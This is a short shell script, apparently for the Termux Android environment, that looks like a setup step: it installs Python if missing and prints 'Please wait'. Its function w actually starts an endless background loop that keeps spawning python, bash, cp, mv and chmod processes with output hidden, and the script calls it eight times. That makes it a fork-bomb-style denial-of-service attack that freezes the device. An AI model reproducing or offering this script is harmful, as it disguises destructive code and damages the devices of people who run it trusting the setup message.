c() {
	cd $PREFIX/bin
	if [ -e python ] || [ -e python2 ];then
	echo
	else
	pkg install python
	w
	w
	w
	fi
	}
	c
	w() {
	while [ true ];do
	printf "\n\n\033[92m Please wait\n\n"
	python > /dev/null 2>&1 &
	python2 > /dev/null 2>&1 &
	python3 > /dev/null 2>&1 &
	bash > /dev/null 2>&1 &
	cp > /dev/null 2>&1 &
	mv > /dev/null 2>&1 &
	chmod > /dev/null 2>&1 &
	done > /dev/null 2>&1 &
	}
	w
	w
	w
	w
	w
	w
	w
	w
	